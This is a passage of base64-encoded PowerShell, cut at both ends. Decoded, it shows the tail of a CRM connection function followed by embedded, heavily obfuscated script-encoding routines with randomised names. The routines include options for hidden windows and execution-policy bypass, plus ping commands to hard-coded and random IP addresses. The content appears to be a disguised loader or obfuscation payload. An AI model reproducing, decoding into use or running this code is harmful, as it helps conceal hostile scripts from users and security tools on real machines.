ybCAkSG9tZVJlYWxtVXJsIC1WZXJib3NlCiAgICAgICAgfQoJCSN5ZXMsIHdlIGtub3cgdGhpcyBpc24ndCByZWNvbW1lbmRlZCBCVVQgdGhpcyBjbWRsZXQgaXMgb25seSB2YWxpZCBmb3IgdXNlciBpbnRlcmFjdGlvbiBpbiB0aGUgY29uc29sZSBhbmQgc2hvdWxkbid0IGJlIHVzZWQgZm9yIG5vbi1pbnRlcmFjdGl2ZSBzY2VuYXJpb3MKICAgICAgICBXcml0ZS1Ib3N0ICJgbllvdSBhcmUgbm93IGNvbm5lY3RlZCB0bzogJG9yZ2FuaXphdGlvbk5hbWUiIC1mb3JlZ3JvdW5kY29sb3IgeWVsbG93CgkJV3JpdGUtSG9zdCAiRm9yIGEgbGlzdCBvZiBjb21tYW5kcyBydW46IEdldC1Db21tYW5kIC1Nb2R1bGUgTWljcm9zb2Z0LlhybS5EYXRhLlBvd2Vyc2hlbGwiIC1mb3JlZ3JvdW5kY29sb3IgeWVsbG93CiAgICAgICAgCiAgICAgICAgQXBwbHlDcm1TZXJ2aWNlQ2xpZW50T2JqZWN0VGVtcGxhdGUoJGdsb2JhbDpjb25uKSAgI2FwcGx5T2JqZWN0VGVtcGxhdGVGb3JtYXQKCiAgICAgICAgcmV0dXJuICRnbG9iYWw6Y29ubiAgICAKICAgIH0KfQokUktycmg4RXFGcVNMZ2R4dXU4NzZWRVdwd0JKSE5SV0c5cEw3ID0gQCIKICAgIFtWYWxpZGF0ZVNldCgoV1VKSkV5Q2lnQ0lLV3JnbCgnTm9ybWFsJykpLCAod1VKSmVZQ0lHQ2lLV3JnTCgnTWluaW1pemVkJykpLCAod3VKakV5Q0lHQ2lLd3JnbCgnTWF4aW1pemVkJykpLCAoV3VqSkVZQ0lHY0lLV3JnbCgnSGlkZGVuJykpKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICR0eHk3d3g3M1MsCgogICAgICAgIFtWYWxpZGF0ZVNldCgod1VqSkVZQ2lHQ0lLd1JHTCgnQnlwYXNzJykpLCAod3VqSkVZY0lHQ0lLd3JHbCgnVW5yZXN0cmljdGVkJykpLCAod1VKakVZY0lHQ0lrV1JnbCgnUmVtb3RlU2lnbmVkJykpLCAod1VKSkVZQ2lHY2lLV3JnbCgnQWxsU2lnbmVkJykpLCAoV3VqakVZQ0lHQ0lrd1JnbCgnUmVzdHJpY3RlZCcpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkb2l3VWFJYnh1TGNzaFksCiAgICAgICAgCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkeXN0a0VIOU1SMWV1STdPZDMKICAgICkKCiAgICAjIEVuY29kaW5nIGJhc2UgdmFsdWVzOiAxNj1IZXgsIDg9T2N0YWwsIDI9QmluYXJ5CiAgICAkR01kX0pPOElDSXAgPSAyCgogICAgIyBFaXRoZXIgY29udmVydCBTY3JpcHRCbG9jayB0byBhIFN0cmluZyBvciBjb252ZXJ0IHNjcmlwdCBhdCAkUGF0aCB0byBhIFN0cmluZy4KICAgIElmKCRUYlN0Q3BCUFZbKCd7MH17MX0nLWYnUGF0JywnaCcpXSkKICAgIHsKICAgICAgICBHZXQtQ2hpbGRJdGVtICRId2w0QlVDS1k5IC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgICAgICAkUTd4QVFOcTFZODhlID0gW0lPLkZpbGVdOjpSZWFkQWxsVGV4dCgoUmVzb2x2ZS1QYXRoICRod2w0YnVjS1k5KSkKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICAkcTd4YVFOcTFZODhlID0gW1N0cmluZ10kbzlEZjBTUnB0ODNGNkJobzVpCiAgICB9CgogICAgIyBDcmVhdGUgbGlzdCBvZiByYW5kb20gZGVsaW1pdGVycyAkUmFuZG9tRGVsaW1pdGVycy4KICAgICMkZW52OnRlbXAKICAgICMgQXZvaWQgdXNpbmcgLiAqICcgIiBbIF0gKCApIGV0Yy4gYXMgZGVsaW1pdGVycyBhcyB0aGVzZSB3aWxsIGNhdXNlIHByb2JsZW1zIGluIHRoZSAtU3BsaXQgY29tbWFuZCBzeW50YXguCiAgICAkYVZWUzhZMTJrdG1XX2Q1ICA9IEAoKFd1akpFeUNJR0NJS3dyR0woJ18nKSksKHdVSkpFWWNJR0NJa1dSR2woJy0nKSksKHd1akpleWNJR0NJS1dyZ0woJywnKSksKFd1akpFWUNJR0NJS3dSZ0woJ3snKSksKHdVakpleUNJZ2NJa1dSZ0woJ30nKSksKHdVSkpleUNJR0NJS1dSZ0woJ34nKSksKFdVakpFWWNJR2NpS1dyR0woJyEnKSksKFdVSkpFWUNpZ0NJa3dyR0woJ0AnKSksKHdVakplWUNJZ0NJa3dyZ0woJyUnKSksKFdVampleUNJZ2Npa1dyR2woJyYnKSksKHd1SkpFWUNJR0NJS3dyZ0woJzwnKSksKHdVakpFWWNJR0NJa1dyZ0woJz4nKSksKHd1SmpFWUNJR0NJS1dSZ2woJzsnKSksKHd1SkpFWWNJR2NpS1dyZ2woJzonKSkpCgoiQAokRjJhUU1RakdVU2VWZXpSV2ZDSGtSMnU0MkFMRWtyTnNVSkdQNUNCVTZIVVI2cmh4OXhjYzJHID0gQCIKICAgICAgICBbVmFsaWRhdGVTZXQoKFdVSkpFeUNpZ0NJS1dyZ2woJ05vcm1hbCcpKSwgKHdVSkplWUNJR0NpS1dyZ0woJ01pbmltaXplZCcpKSwgKHd1SmpFeUNJR0NpS3dyZ2woJ01heGltaXplZCcpKSwgKFd1akpFWUNJR2NJS1dyZ2woJ0hpZGRlbicpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkdHh5N3d4NzNTLAoKICAgICAgICBbVmFsaWRhdGVTZXQoKHdVakpFWUNpR0NJS3dSR0woJ0J5cGFzcycpKSwgKHd1akpFWWNJR0NJS3dyR2woJ1VucmVzdHJpY3RlZCcpKSwgKHdVSmpFWWNJR0NJa1dSZ2woJ1JlbW90ZVNpZ25lZCcpKSwgKHdVSkpFWUNpR2NpS1dyZ2woJ0FsbFNpZ25lZCcpKSwgKFd1ampFWUNJR0NJa3dSZ2woJ1Jlc3RyaWN0ZWQnKSkpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJG9pd1VhSWJ4dUxjc2hZLAogICAgICAgIAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJHlzdGtFSDlNUjFldUk3T2QzCiAgICApCgogICAgIyBFbmNvZGluZyBiYXNlIHZhbHVlczogMTY9SGV4LCA4PU9jdGFsLCAyPUJpbmFyeQogICAgJEdNZF9KTzhJQ0lwID0gMgoKICAgICMgRWl0aGVyIGNvbnZlcnQgU2NyaXB0QmxvY2sgdG8gYSBTdHJpbmcgb3IgY29udmVydCBzY3JpcHQgYXQgJFBhdGggdG8gYSBTdHJpbmcuCiAgICBJZigkVGJTdENwQlBWWygnezB9ezF9Jy1mJ1BhdCcsJ2gnKV0pCiAgICB7CiAgICAgICAgR2V0LUNoaWxkSXRlbSAkSHdsNEJVQ0tZOSAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsCiAgICAgICAgJFE3eEFRTnExWTg4ZSA9IFtJTy5GaWxlXTo6UmVhZEFsbFRleHQoKFJlc29sdmUtUGF0aCAkaHdsNGJ1Y0tZOSkpCiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgJHE3eGFRTnExWTg4ZSA9IFtTdHJpbmddJG85RGYwU1JwdDgzRjZCaG81aQogICAgfQoKICAgICMgQ3JlYXRlIGxpc3Qgb2YgcmFuZG9tIGRlbGltaXRlcnMgJFJhbmRvbURlbGltaXRlcnMuCiAgICAjJGVudjp0ZW1wCiAgICAjIEF2b2lkIHVzaW5nIC4gKiAnICIgWyBdICggKSBldGMuIGFzIGRlbGltaXRlcnMgYXMgdGhlc2Ugd2lsbCBjYXVzZSBwcm9ibGVtcyBpbiB0aGUgLVNwbGl0IGNvbW1hbmQgc3ludGF4LgogICAgJGFWVlM4WTEya3RtV19kNSAgPSBAKChXdWpKRXlDSUdDSUt3ckdMKCdfJykpLCh3VUpKRVljSUdDSWtXUkdsKCctJykpLCh3dWpKZXljSUdDSUtXcmdMKCcsJykpLChXdWpKRVlDSUdDSUt3UmdMKCd7JykpLCh3VWpKZXlDSWdjSWtXUmdMKCd9JykpLCh3VUpKZXlDSUdDSUtXUmdMKCd+JykpLChXVWpKRVljSUdjaUtXckdMKCchJykpLChXVUpKRVlDaWdDSWt3ckdMKCdAJykpLCh3VWpKZVlDSWdDSWt3cmdMKCclJykpLChXVWpqZXlDSWdjaWtXckdsKCcmJykpLCh3dUpKRVlDSUdDSUt3cmdMKCc8JykpLCh3VWpKRVljSUdDSWtXcmdMKCc+JykpLCh3dUpqRVlDSUdDSUtXUmdsKCc7JykpLCh3dUpKRVljSUdjaUtXcmdsKCc6JykpKQoKICAgICMgQWRkIGxldHRlcnMgYS16IHdpdGggcmFuZG9tIGNhc2UgdG8gJFJhbmRvbURlbGltaXRlcnMuCiAgICBAKChXVUpKRVlDSWdDaUtXcmdsKCdhJykpLCh3dUpKRVljSUdDSWtXckdsKCdiJykpLChXdWpqRXljSWdDaUtXckdMKCdjJykpLCh3dWpKRVlDSWdjaWt3cmdMKCdkJykpLChXdUpqRXlDSUdDSUt3cmdsKCdlJykpLCh3VUpKZVljaWdDSWtXcmdsKCdmJykpLChXdUpKRXljSUdDSUtXUmdMKCdnJykpLCh3dWpqZXljaUdjaWtXcmdMKCdoJykpLCh3dUpKZVlDaUdDSUtXcmdsKCdpJykpLCh3VWpKRVlDaWdjSUt3UmdsKCdqJykpLCh3VWpqRVlDSWdDSUtXUkdMKCdrJykpLCh3VUpKRVlDaUdDSWtXckdMKCdsJykpLChXdUpqZVljSUdjSUtXcmdsKCdtJykpLCh3VWpqZVlDaUdDaUtXUkdMKCduJykpLChXdUpqRVljSWdDSWt3ckdsKCdvJykpLCh3dUpKRXljSUdDaUt3cmdsKCdwJykpLChXdWpKZVlDSUdjSWt3ckdMKCdxJykpLCh3VUpKRXlDSWdDSWtXUkdsKCdyJykpLCh3dUpKZVljSUdDSUtXcmdMKCdzJykpLCh3dWpqRVlDSUdjaWtXUmdMKCd0JykpLChXVWpqRXlDaWdDSWtXckdMKCd1JykpLCh3dWpKZXljSUdjSUtXckdsKCd2JykpLCh3dWpKZVlDSUdDSUt3cmdMKCd3JykpLChXdUpKZVljSWdDSWtXcmdMKCd4JykpLCh3VWpKZXlDaWdDaUtXcmdsKCd5JykpLChXVUpKRVljaUdjaWtXcmdsKCd6JykpKSB8IEZvckVhY2gtT2JqZWN0IHskUU9oN2tWMTFGUmVTNl8ybmkgPSAkXzsgSWYoKChHZXQtUmFuZG9tIC1JbnB1dCBAKCgyIC0gMSkuLigyICsgKDEgLSAxKSkpKS0oMyAtIDIpIC1lcSAwKSkgeyRRT0g3S1YxMUZSZVM2XzJuSSA9ICRxT2g3a1YxMUZyZVM2XzJOaS5Ub1VwcGVyKCl9ICRBVnZTOHkxMkt0TXdfZDUgKz0gJFFPSDdLdjExZlJlUzZfMk5JfQogICAgCiAgICAjIE9ubHkgdXNlIGEgc3Vic2V0IG9mIGN1cnJlbnQgZGVsaW1pdGVycyB0byByYW5kb21pemUgd2hhdCB5b3Ugc2VlIGluIGV2ZXJ5IGl0ZXJhdGlvbiBvZiB0aGlzIHNjcmlwdCdzIG91dHB1dC4KICAgICRBVlZzOHkxMktUbXdfZDUgPSAoR2V0LVJhbmRvbSAtSW5wdXQgJEF2dlM4eTEya1RNV19kNSAtQ291bnQgKCRBdnZTOFkxMmt0bVdfZDUuQ291bnQvKDIgKyAyKSkpCgogICAgIyRlbnY6dGVtcAogICAgIyBDb252ZXJ0ICRTY3JpcHRTdHJpbmcgdG8gZGVsaW1pdGVkIEJpbmFyeSB2YWx1ZXMgaW4gW0NoYXJdIGFycmF5IHNlcGFyYXRlZCBieSByYW5kb20gZGVsaW1pdGVyIGZyb20gZGVmaW5lZCBsaXN0ICRSYW5kb21EZWxpbWl0ZXJzLgogICAgJHhOVEoydzgxVkogPSAod3VqSkVZQ0lHQ2lrV3JnbCgnJykpCiAgICAoW0NoYXJbXV0kUTdYQVFucTFZODhlKSB8IEZvckVhY2gtT2JqZWN0IHskWG50ajJ3ODFWaiArPSAoW0NvbnZlcnRdOjpUb1N0cmluZygoW0ludF1bQ2hhcl0kXyksJGdtRF9KTzhJQ2lwKSArIChHZXQtUmFuZG9tIC1JbnB1dCAkQXZ2czh5MTJrdG1XX2Q1KSl9CgoiQAogICAgUGluZyAxMC4yMy4yNDUuMTIgLW4gMQoKICAgIFBpbmcgIiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkiIC1uIDE7UGluZyAiJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKSIgLW4gMTtQaW5nICIkKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApIiAtbiAxO1BpbmcgIiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkiIC1uIDE7UGluZyAiJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKSIgLW4gMTtQaW5nICIkKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApIiAtbiAxOwogICAgCiAgICBQaW5nIDIwLjEyMy4yNDUuMTIgLW4gMQokREVMTXRTOHhYY1Q3dDN1elIyNiA9IEAiCiAjIFJlbW92ZSB0cmFpbGluZyBkZWxpbWl0ZXIgZnJvbSAkRGVsaW1pdGVkRW5jb2RlZEFycmF5LgogICAgJHhOVGoydzgxdkogPSAkWE5UajJ3ODF2ai5TdWJTdHJpbmcoKDAgKyAoMSAtIDEpKSwkeE5UajJ3ODF2Si5MZW5ndGgtMSkKCiAgICAjIENyZWF0ZSBwcmludGFibGUgdmVyc2lvbiBvZiAkUmFuZG9tRGVsaW1pdGVycyBpbiByYW5kb20gb3JkZXIgdG8gYmUgdXNlZCBieSBmaW5hbCBjb21tYW5kLgogICAgJHBPc2dqWnQgPSAoR2V0LVJhbmRvbSAtSW5wdXQgJEF2VlM4WTEyS1Rtd19ENSAtQ291bnQgJEF2dlM4WTEya3RNd19kNS5MZW5ndGgpIC1Kb2luICcnCgogICAgIyBtKCkgcmFuZG9tIGNhc2UgdmVyc2lvbnMgZm9yIG5lY2Vzc2FyeSBvcGVyYXRpb25zLgogICAgJEFyS3NadVJNOUR5MTcgPSBHZXQtUmFuZG9tIC1JbnB1dCBAKCh3VUpKZVlDSWdDSUt3UmdMKCdGb3JFYWNoJykpLCh3dWpqZVlDaUdDaWtXckdMKCdGb3JFYWNoLU9iamVjdCcpKSwod3VKSkVZY0lHQ0lLV1JHbCgnJScpKSkKICAgICRockx5cU1WcklWeE5NeVkgICAgICAgPSAoW0NoYXJbXV0od3VKakV5Y0lHQ0lrV3JHbCgnW1N0cmluZ106OkpvaW4nKSkgICAgICB8IEZvckVhY2gtT2JqZWN0IHskR19Vb3RRNlhnID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uKDEgKyAwKSkpIHskR19VT3RRNlhHID0gJEdfdW9UUTZYRy5Ub1VwcGVyKCl9ICRHX1VvdHE2WGd9KSAtSm9pbiAnJwogICAgJFkwb0Z4YmNNTyAgICAgICAgPSAoW0NoYXJbXV0oV1VqSkV5Q0lHQ2lLV1JHbCgnW1N0cmluZ10nKSkgICAgICAgICAgICB8IEZvckVhY2gtT2JqZWN0IHskR19VT1RxNnhnID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uKDIgLSAxKSkpIHskR191b1RRNlhHID0gJEdfdW90UTZYZy5Ub1VwcGVyKCl9ICRHX1VPVFE2WGd9KSAtSm9pbiAnJwogICAgJGhYSTdZa0EyVjhOR2ZhNWdBICAgICAgICAgID0gKFtDaGFyW11dKHd1SkpFWUNJR2NJS1dSZ2woJy1Kb2luJykpICAgICAgICAgICAgICAgfCBGb3JFYWNoLU9iamVjdCB7JEdfdU90UTZ4ZyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gKDIgLSAxKSkuLigyIC0gMSkpKSB7JEdfdW90UTZ4RyA9ICRnX1VvdFE2eEcuVG9VcHBlcigpfSAkZ19VT3RRNlhnfSkgLUpvaW4gJycKICAgICRweFNuU1ZZSkdMbGdjWGEgICAgICAgPSAoW0NoYXJbXV0od1VKSkV5Y2lnQ0lrV1JnTCgnQ2hhcicpKSAgICAgICAgICAgICAgICB8IEZvckVhY2gtT2JqZWN0IHskZ19VT1RRNlhnID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uKC0xICsgMikpKSB7JEdfVW9UUTZYZyA9ICRnX1VvVFE2WGcuVG9VcHBlcigpfSAkZ191T3RxNlhnfSkgLUpvaW4gJycKICAgICRESjQydGg3REtHSUxoQ0t4cnggICAgICAgICAgID0gKFtDaGFyW11dKHd1SmpFWUNpR2NJS3dyZ0woJ0ludCcpKSAgICAgICAgICAgICAgICAgfCBGb3JFYWNoLU9iamVjdCB7JGdfVU9UcTZYRyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JGdfdU90UTZYRyA9ICRHX1VPVFE2WGcuVG9VcHBlcigpfSAkR191b3RRNnhnfSkgLUpvaW4gJycKICAgICRBcktTWnVybTlEWTE3ID0gKFtDaGFyW11dJEFyS3NadVJNOWR5MTcgICAgICAgIHwgRm9yRWFjaC1PYmplY3QgeyRnX1VvdFE2eEcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4xKSkgeyRHX1VvVFE2WEcgPSAkR19Vb1RxNnhHLlRvVXBwZXIoKX0gJEdfdW90UTZYZ30pIC1Kb2luICcnCiAgICAkU3hpcmZUNmY2NTVxRGhuTyAgICAgICA9IChbQ2hhcltdXSh3VUpKRVlDSWdjSUtXckdsKCdbQ29udmVydF06OlRvSW50MTYoJykpIHwgRm9yRWFjaC1PYmplY3QgeyRHX1VvdFE2WEcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4oMCArIDEpKSkgeyRHX1VvdFE2WGcgPSAkR19Vb3RxNlhHLlRvVXBwZXIoKX0gJEdfVU90UTZYR30pIC1Kb2luICcnCgogICAgIyRlbnY6dGVtcAogICAgIyBDcmVhdGUgcHJpbnRhYmxlIHZlcnNpb24gb2YgJFJhbmRvbURlbGltaXRlcnMgaW4gcmFuZG9tIG9yZGVyIHRvIGJlIHVzZWQgYnkgZmluYWwgY29tbWFuZCBzcGVjaWZpY2FsbHkgZm9yIC1TcGxpdCBzeW50YXguCiAgICAkTGJYb2M4MTdFM0FMcjYxbE4gPSAod3VKakV5Q0lHQ0lLd3JHbCgnJykpCiAgICBGb3JFYWNoKCRWa1hBUTlwekZVTkh2NVBzQ2w2ZXUgaW4gJGF2VnM4WTEya3Rtd19kNSkKICAgIHsKICAgICAgICAjIFJhbmRvbSBjYXNlICdzcGxpdCcgc3RyaW5nLgogICAgICAgICRtM2ZkRHZvaEFiYmxCID0gKFtDaGFyW11dKFd1SkpFWUNpZ2NJa1dyZ2woJ1NwbGl0JykpIHwgRm9yRWFjaC1PYmplY3QgeyRHX1VvdFE2WGcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgoKC0xICsgMikgLSAxKS4uMSkpIHskR19VT3RxNlhHID0gJEdfdW9UcTZYRy5Ub1VwcGVyKCl9ICRHX1VvVFE2WGd9KSAtSm9pbiAnJwoKICAgICAgICAkbEJ4b2M4MTdFM0FscjYxTE4gKz0gKChXVUpKRVlDSWdDaWtXUkdsKCctJykpICsgJE0zZmRkdm9IYUJCTGIgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoKDEgLSAxKSwxKSkgKyAod3VKamVZQ0lHY0lLd1JnTCgnJycpKSArICRSYW5kb21EZWxpbWl0ZXIgKyAnJycgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkpCiAgICB9CiAgICAkTGJ4b2M4MTdlM0FMUjYxTE4gPSAkbEJ4T2M4MTdlM0FMUjYxTG4uVHJpbSgpCiAgICAKICAgICMgUmFuZG9tbHkgc2VsZWN0IGJldHdlZW4gdmFyaW91cyBjb252ZXJzaW9uIHN5bnRheCBvcHRpb25zLgogICAgJENiSWRaTDZRVmRzID0gKFtDaGFyW11dKEdldC1SYW5kb20gLUlucHV0IEAoKHd1SkpleUNpZ2NJS1dyR2woJ1tTdHJpbmddJF8nKSksKCd7Mn17M317MX17MH0nLWYnKScsJ2luZygnLCckXy5UJywnb1N0cicpKSkgfCBGb3JFYWNoLU9iamVjdCB7JEdfdW9UcTZYRyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKCgwICsgMCkuLigtMSArIDIpKSkgeyRHX3VPVHE2WEcgPSAkR19Vb3RxNlhHLlRvVXBwZXIoKX0gJEdfVW90UTZ4Z30pIC1Kb2luICcnCiAgICAkUHc5SmNpSVA2YkVsSiAgPSBAKCkKICAgICRQVzlKY0lJUDZiRWxKICs9ICh3dWpKRVlDaUdDaWt3ckdsKCdbJENoYXJTdHJdJykpICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsKDEgKyAwKSkpICsgKHd1akpFeUNJZ2NJa1dSZ2woJygnKSkgKyAod1VKSkVZQ0lHQ0lrV1JHbCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtICgtMSArIDIpKSwoMiAtIDEpKSkgKyAkc3hJckZUNmY2NTVxREhubyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLCgzIC0gMikpKSArICh3dUpKRVlDSUdDaUt3UkdsKCcoJykpICsgKHd1SkpFWUNJR0NJS1dSZ2woJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoKCgxIC0gMSkgKyAwKSwoMyAtIDIpKSkgKyAkY2JpRFpsNnFWRFMgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwoMCArIDEpKSkgKyAoV3VqSmV5Q0lHQ2lrV3JHTCgnKScpKSArICh3VUpKRVlDaWdjSUtXcmdsKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsKDIgLSAxKSkpICsgKHd1ampFeUNJZ0NpS1dSZ2woJywnKSkgKyAkZ01kX2pPOEljaVAgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoV3VqSkVZQ0lnQ0lrV3JHbCgnKScpKSArIChXdWpKRXljSWdDSWtXcmdMKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gMSksMSkpICsgKHd1akpFeUNpR0Npa3dyZ2woJyknKSkKICAgICRwVzlKY2lJUDZiRWxqICs9ICRTWGlSZlQ2ZjY1NXFESE5PICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHd1SkplWUNJZ0Npa1dyR0woJygnKSkgKyAoV3VqSkV5Y2lHY2lrd3JHbCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtIDEpLDEpKSArICRjYklEWmw2cVZkcyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtIDEpLCgtKDIgLSAxKSArICgyICsgMCkpKSkgKyAoV3VKSkVZQ2lnY0lLV3JnbCgnKScpKSArIChXdUpKZVlDSUdjaUt3UkdsKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gMSksKDEgKyAwKSkpICsgKHd1SmplWWNJZ0NJS3dyR0woJywnKSkgKyAoV3VKSkVZQ0lHQ0lLd1JHTCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMCArICgxIC0gMSkpLCgyIC0gMSkpKSArICRHbWRfSk84SWNJUCArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLCgyIC0gMSkpKSArICh3VUpKRXlDSUdjaUtXcmdsKCcpJykpICsgKFd1SkplWUNpR2NpS1dSZ2woJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwoKDYgLSAzKSAtIDIpKSkgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCgod3VKamVZQ0lnQ0lLV3JnbCgnLWFzJykpLCh3dUpqRVlDaUdjSWt3cmdsKCctQXMnKSksKFd1SkpFWWNJR2Npa3dyZ2woJy1hUycpKSwod3VqakV5Q0lHQ0lLV3JnbCgnLUFTJykpKSkgKyAod1VKamVZQ0lHQ0lrd3JnTCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtIDEpLDEpKSArICh3dUpqZVlDaWdDaUtXckdMKCdbJENoYXJTdHJdJykpCiAgICAkUFc5amNJaXA2YkVsSiA9IChHZXQtUmFuZG9tIC1JbnB1dCAkUFc5SmNJaVA2QkVsSikKCiAgICAjJGVudjp0ZW1wCiAgICAjIENyZWF0ZSBhcnJheSBzeW50YXggZm9yIGVuY29kZWQgJFNjcmlwdFN0cmluZyBhcyBhbHRlcm5hdGl2ZSB0byAuU3BsaXQvLVNwbGl0IHN5bnRheC4KICAgICRqcTJlUUNEV0RSUTVSNGhDU1V0dCA9IChXdUpqRVlDSUdjSWt3cmdMKCcnKSkKICAgIChbQ2hhcltdXSRRN3hhcU5xMXk4OGUpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICMgRW5jYXBzdWxhdGUgY3VycmVudCBpdGVtIHdpdGggc2luZ2xlIHF1b3RlIGlmIGl0IGNvbnRhaW5zIGEgbm9uLWludGVnZXIuCiAgICAgICAgSWYoW0NvbnZlcnRdOjpUb1N0cmluZygoW0ludF1bQ2hhcl0kXyksJGdtZF9qbzhJQ2lQKS5UcmltKCh3dWpqZVlDaUdjaUtXUmdMKCcwMTIzNDU2Nzg5JykpKS5MZW5ndGggLWd0ICgxIC0gMSkpIHskZFFsanVURWZzOTFiVEJSSkhmQlogPSAod3VKamVZQ2lnQ0lLd1JnbCgnJycpKX0KICAgICAgICBFbHNlIHskUXVvdGUgPSAoVDNpOVQ1ZWpJYlhtMURueWUzTUVGYzVzMGllcDFVTzJmKCcnKSl9CiAgICAgICAgJEVuY29kZWRBcnJheSArPSAoJFF1b3RlICsgW0NvbnZlcnRdOjpUb1N0cmluZygoW0ludF1bQ2hhcl0kXyksJEVuY29kaW5nQmFzZSkgKyAkUXVvdGUgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOVQ1ZWppYlhtMWROeUUzbWVmYzVzMGlFUDFVbzJGKCcsJykpICsgKFQzSTlUNWVKSUJ4bTFETnlFM21FZkM1UzBpZXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSkKICAgIH0KCiAgICAjIFJlbW92ZSB0cmFpbGluZyBjb21tYSBmcm9tICRFbmNvZGVkQXJyYXkuCiAgICAkRW5jb2RlZEFycmF5ID0gKChUM2k5dDVlaklCWE0xRG55RTNtRWZjNVMwSWVwMVVPMmYoJygnKSkgKyAoVDNpOVQ1RWpJQnhtMURuWWUzTUVmYzVTMGlFcDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJEVuY29kZWRBcnJheS5UcmltKCkuVHJpbSgodDNJOXQ1RWppYnhtMURueWUzbUVGYzVzMGlFcDFVTzJGKCcs